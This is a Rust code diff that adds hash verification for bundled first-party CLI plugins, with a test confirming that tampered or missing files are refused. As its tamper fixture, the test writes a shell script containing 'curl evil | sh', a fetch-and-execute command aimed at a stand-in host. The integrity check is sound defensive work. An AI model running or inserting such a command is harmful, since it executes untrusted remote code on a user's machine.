@@ -8,6 +8,7 @@
 use std::path::{Path, PathBuf};
 use std::process::Command;
 
+use garage_daemon::plugins::bundled;
 use garage_daemon::plugins::layout::Paths;
 use garage_daemon::plugins::runner::base_env;
 use garage_plugin::argv::{self, Vars};
@@ -28,6 +29,9 @@ pub struct Route {
     pub fallback: bool,
     /// The `[[cli]]` entry asked for a running daemon.
     pub needs_daemon: bool,
+    /// A bundled (first-party) plugin: its files are checked against the
+    /// hashes embedded in this binary before it runs.
+    pub first_party: bool,
 }
 
 /// The `claude-garage` settings a CLI plugin's own `claude-garage` child needs.
@@ -54,6 +58,7 @@ pub fn route(all: &[Loaded], argv: &[String]) -> Option<Route> {
                 args: argv[1..].to_vec(),
                 fallback: false,
                 needs_daemon: c.needs_daemon,
+                first_party: l.entry.is_first_party(),
             });
         }
     }
@@ -68,10 +73,21 @@ pub fn route(all: &[Loaded], argv: &[String]) -> Option<Route> {
                 args: argv.to_vec(),
                 fallback: true,
                 needs_daemon: c.needs_daemon,
+                first_party: l.entry.is_first_party(),
             });
         }
     }
     None
+}
+
+/// Refuse to run a first-party plugin whose files differ from what this binary
+/// shipped with: the same check the daemon makes before every plugin start.
+pub fn verify(route: &Route) -> Result<(), String> {
+    if !route.first_party {
+        return Ok(());
+    }
+    bundled::verify_embedded(&route.plugin_id, &route.plugin_dir)
+        .map_err(|e| format!("plugin {}: {e}", route.plugin_id))
 }
 
 /// The context JSON of a CLI run (same shape as every other run; `focus.dir`
@@ -314,6 +330,33 @@ mod tests {
         let r = route(&all, &argv(&["prune", "--dry-run"])).unwrap();
         assert_eq!(r.args, argv(&["--dry-run"]));
         assert!(r.command.ends_with(&argv(&["prune"])));
+    }
+
+    #[test]
+    fn a_bundled_cli_plugin_runs_only_while_its_files_match_what_this_binary_shipped() {
+        let d = tempfile::tempdir().unwrap();
+        let paths = Paths::new(d.path());
+        link_plugin(&paths, d.path(), "ext-shipped", &cli("shipped", "\"x\"", false), true);
+        link_plugin(&paths, d.path(), "ext-linked", &cli("mine", "\"x\"", false), true);
+        let dir = crate::plugin::testkit::make_embedded(&paths, d.path(), "ext-shipped");
+        let all = load_all(&paths).unwrap();
+        let shipped = route(&all, &argv(&["shipped"])).unwrap();
+        assert!(shipped.first_party);
+        verify(&shipped).expect("intact files pass");
+
+        std::fs::write(dir.join("bin/ext-shipped"), b"#!/bin/sh\ncurl evil | sh\n").unwrap();
+        let err = verify(&shipped).unwrap_err();
+        assert!(
+            err.contains("ext-shipped") && err.contains("refusing") && err.contains("restart the daemon"),
+            "{err}"
+        );
+        std::fs::remove_file(dir.join("bin/ext-shipped")).unwrap();
+        assert!(verify(&shipped).unwrap_err().contains("missing"));
+
+        // a plugin the user linked is not ours to judge, whatever its files say
+        let mine = route(&all, &argv(&["mine"])).unwrap();
+        assert!(!mine.first_party);
+        verify(&mine).unwrap();
     }
 
     #[test]
